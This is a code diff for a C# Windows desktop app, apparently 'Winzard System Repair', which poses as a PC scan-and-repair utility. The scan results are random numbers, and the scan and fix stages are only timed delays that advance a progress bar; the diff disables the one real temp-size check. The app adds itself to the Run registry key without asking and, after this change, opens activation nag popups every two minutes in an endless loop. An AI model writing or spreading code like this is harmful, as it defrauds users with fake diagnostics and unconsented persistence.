@@ -1,19 +1,17 @@
 ﻿using System;
 using System.IO;
 using System.Management;
-using System.Threading;
-using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Input;
-using System.Windows.Media;
-using WpfAnimatedGif;
 using Winzard_System_Repair;
 using Microsoft.Win32;
-using IWshRuntimeLibrary;
 using System.Reflection;
 using System.Windows.Forms;
 using System.Drawing;
+using System.Diagnostics;
+using System.Threading.Tasks;
+using System.Windows.Media;
 
 namespace WPFUI
 {
@@ -25,22 +23,26 @@ namespace WPFUI
         NotifyIcon nIcon = new NotifyIcon();
         PopupWindow1 Popupsub;
         PopupWindow2 Popupsub2;
-        PopupWindow4 Popupsub3;
-        int premium = 0, micro = 0, mega = 0;
+        PopupWindow3 popupmain;
+        PopupWindow4 popupmain1;
+        int premium = 0, mega = 0;
         float sizedir;
         public MainWindow()
         {
             InitializeComponent();
+            Directory.SetCurrentDirectory(AppDomain.CurrentDomain.BaseDirectory);
+            RenderOptions.ProcessRenderMode = System.Windows.Interop.RenderMode.SoftwareOnly;
             RegistryKey reg1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             Assembly curAssembly = Assembly.GetExecutingAssembly();
-            reg1.SetValue(curAssembly.GetName().Name, curAssembly.Location);
-            /*reg1.SetValue("Winzard System Repair", System.Windows.Forms.Application.ExecutablePath.ToString());*/
+            /*reg1.SetValue(curAssembly.GetName().Name, curAssembly.Location);*/
+            reg1.SetValue(curAssembly.GetName().Name, System.Windows.Forms.Application.ExecutablePath.ToString());
             sysdet1.Content = GetAccount1() + Environment.NewLine;
             sysdet2.Content = GetAccount2() + Environment.NewLine;
             sysdet3.Content = GetAccount3() + Environment.NewLine;
             sysdet4.Content = GetAccount4() + Environment.NewLine;
             NotPremium();
             afternumber();
+            Popups();
         }
         //display number
         private void afternumber()
@@ -60,42 +62,6 @@ namespace WPFUI
             Startupoptimizations.Text = startup.ToString();
             int privacy = rnd.Next(100, 700);
             PrivacyTraces.Text = privacy.ToString();
-        }
-        //startup shortcut
-        public static void CreateShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
-        {
-            string appPath = Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
-            string startuplocation = System.Windows.Forms.Application.ExecutablePath.ToString();
-            string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
-            WshShell shell = new WshShell();
-            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);
-
-            shortcut.Description = "";   // The description of the shortcut
-            shortcut.TargetPath = startuplocation;                 // The path of the file that will launch when the shortcut is run
-            shortcut.WorkingDirectory = appPath;
-            shortcut.Save();                                    // Save the shortcut
-        }
-        //Minimised parameaters
-        void App_Startup(object sender, StartupEventArgs e)
-        {
-            // Application is running
-            // Process command line args
-            bool startMinimized = false;
-            for (int i = 0; i != e.Args.Length; ++i)
-            {
-                if (e.Args[i] == "/StartMinimized")
-                {
-                    startMinimized = true;
-                }
-            }
-
-            // Create main application window, starting minimized if specified
-            MainWindow mainWindow = new MainWindow();
-            if (startMinimized)
-            {
-                mainWindow.WindowState = WindowState.Minimized;
-            }
-            mainWindow.Show();
         }
         //For getting system detail info
         private string GetAccount1()
@@ -192,9 +158,9 @@ namespace WPFUI
         public async void Ellipse_MouseDown(object sender, MouseButtonEventArgs e)
         {
             scan.Opacity = 0.8;
-            await System.Threading.Tasks.Task.Delay(100);
+            await Task.Delay(100);
             scan.Opacity = 1;
-            await System.Threading.Tasks.Task.Delay(100);
+            await Task.Delay(100);
             statusgrid.Visibility = Visibility.Visible;
             scan.Visibility = Visibility.Collapsed;
             PCstatus.Visibility = Visibility.Collapsed;
@@ -202,11 +168,10 @@ namespace WPFUI
             loadvid.Visibility = Visibility.Visible;
             loadvid.LoadedBehavior = MediaState.Play;
             Tempdelete();
-            Popups();
         }
 
         //Directory size
-        public long DirSize(DirectoryInfo d)
+        /*public long DirSize(DirectoryInfo d)
         {
             long size = 0;
             // Add file sizes.
@@ -222,13 +187,13 @@ namespace WPFUI
                 size += DirSize(di);
             }
             return size;
-        }
+        }*/
 
         //Temp delete & Scan Progress
         public async void Tempdelete()
         {
             {
-                try
+                /*try
                 {
                     string Temppath = Path.GetTempPath();
                     long Tempsize = DirSize(new DirectoryInfo(Temppath));
@@ -237,7 +202,7 @@ namespace WPFUI
                     Tempsize += DirSize(new DirectoryInfo("C:/Windows/SoftwareDistribution/Download"));
                     sizedir = (float)Convert.ToDouble(string.Format("{0:0.00}", (Tempsize / (1024 * 1024))));
                 }
-                catch { }
+                catch { }*/
                 //Progress
                 //scantext.Text = "Scanning: Malware";
                 scanprogress.Value++;
@@ -259,7 +224,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(12000);
+                await Task.Delay(12000);
                 Loading1.Visibility = Visibility.Hidden;
                 Loading2.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Registry";
@@ -282,7 +247,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(15000);
+                await Task.Delay(15000);
                 Loading2.Visibility = Visibility.Hidden;
                 Loading3.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Security";
@@ -305,7 +270,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(20000);
+                await Task.Delay(20000);
                 Loading3.Visibility = Visibility.Hidden;
                 Loading4.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Startup";
@@ -328,7 +293,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(31000);
+                await Task.Delay(31000);
                 Loading4.Visibility = Visibility.Hidden;
                 Loading5.Visibility = Visibility.Visible;
                 //scantext.Text = "Analyzing: Fragments";
@@ -351,7 +316,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(17000);
+                await Task.Delay(17000);
                 Loading5.Visibility = Visibility.Hidden;
                 Loading6.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Privacy";
@@ -374,7 +339,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(23000);
+                await Task.Delay(23000);
                 Loading6.Visibility = Visibility.Hidden;
                 Loading7.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: System";
@@ -397,7 +362,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(7000);
+                await Task.Delay(7000);
                 Loading7.Visibility = Visibility.Hidden;
                 Loading8.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Junk";
@@ -420,7 +385,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(15000);
+                await Task.Delay(15000);
                 Loading8.Visibility = Visibility.Hidden;
                 Loading9.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: Drivers";
@@ -443,7 +408,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Loading9.Visibility = Visibility.Hidden;
                 Loading10.Visibility = Visibility.Visible;
                 //scantext.Text = "Scanning: System Files";
@@ -466,7 +431,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Loading10.Visibility = Visibility.Hidden;
 
                 load.Visibility = Visibility.Collapsed;
@@ -571,7 +536,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Loading1.Visibility = Visibility.Hidden;
                 Loading2.Visibility = Visibility.Visible;
                 Statuspanel.Text = "Fixing: Registry";
@@ -594,7 +559,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Statuspanel.Text = "Fixing: Security";
                 scanprogress.Value++;
                 
@@ -615,7 +580,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Statuspanel.Text = "Boosting: Startup";
                 scanprogress.Value++;
                 
@@ -636,7 +601,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Statuspanel.Text = "Defragmenting: Drive";
                 scanprogress.Value++;
                 
@@ -657,7 +622,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Statuspanel.Text = "Fixing: Privacy";
                 scanprogress.Value++;
                 
@@ -678,7 +643,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Statuspanel.Text = "Repairing: System";
                 scanprogress.Value++;
                 
@@ -699,7 +664,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Statuspanel.Text = "Deleting: Junk";
                 scanprogress.Value++;
                 
@@ -720,7 +685,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Statuspanel.Text = "Fixing: Drivers";
                 scanprogress.Value++;
                 
@@ -741,7 +706,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 Statuspanel.Text = "Fixing: System Files";
                 scanprogress.Value++;
                 
@@ -762,7 +727,7 @@ namespace WPFUI
                 scanprogress.Value++;
                 
                 scanprogress.Value++;
-                await System.Threading.Tasks.Task.Delay(mega);
+                await Task.Delay(mega);
                 #endregion
 
                 //scanresult.Visibility = Visibility.Visible;
@@ -784,8 +749,7 @@ namespace WPFUI
                 }
             }
         }
-        PopupWindow3 popupmain;
-        PopupWindow4 popupmain1;
+        
 
         //Activation Button & Logic
         public void Activatekey(bool result)
@@ -848,6 +812,10 @@ namespace WPFUI
         {
             support.Visibility = Visibility.Visible;
         }
+        private void EULA_Click(object sender, RoutedEventArgs e)
+        {
+            Process.Start("https://thealliancetech.com/end-user-license-agreement/");
+        }
 
         //About
         private void aboutclose_Click(object sender, RoutedEventArgs e)
@@ -862,7 +830,7 @@ namespace WPFUI
         //Popup
         private async void PopupTimer()
         {
-            await System.Threading.Tasks.Task.Delay(300000);
+            await Task.Delay(300000);
             popupmain = new PopupWindow3();
             if (popupmain.ShowDialog().Value)
             {
@@ -877,24 +845,9 @@ namespace WPFUI
         
         private async void Popups()
         {
-            await System.Threading.Tasks.Task.Delay(480000);
+            await Task.Delay(120000);
             Popupsub = new PopupWindow1();
             if (Popupsub.ShowDialog().Value)
-            {
-                Activatekey(true);
-            }
-            else
-            {
-                Activatekey(false);
-                Popups();
-            }
-        }
-        
-        private async void Popups1()
-        {
-            await System.Threading.Tasks.Task.Delay(480000);
-            Popupsub2 = new PopupWindow2();
-            if (Popupsub2.ShowDialog().Value)
             {
                 Activatekey(true);
             }
@@ -904,9 +857,24 @@ namespace WPFUI
                 Popups1();
             }
         }
+
+        private async void Popups1()
+        {
+            await Task.Delay(120000);
+            Popupsub2 = new PopupWindow2();
+            if (Popupsub2.ShowDialog().Value)
+            {
+                Activatekey(true);
+            }
+            else
+            {
+                Activatekey(false);
+                Popups2();
+            }
+        }
         private async void Popups2()
         {
-            await System.Threading.Tasks.Task.Delay(180000);
+            await Task.Delay(120000);
             popupmain1 = new PopupWindow4();
             if (popupmain1.ShowDialog().Value)
             {
@@ -915,7 +883,7 @@ namespace WPFUI
             else
             {
                 Activatekey(false);
-                Popups2();
+                Popups();
             }
         }
         //Verbose
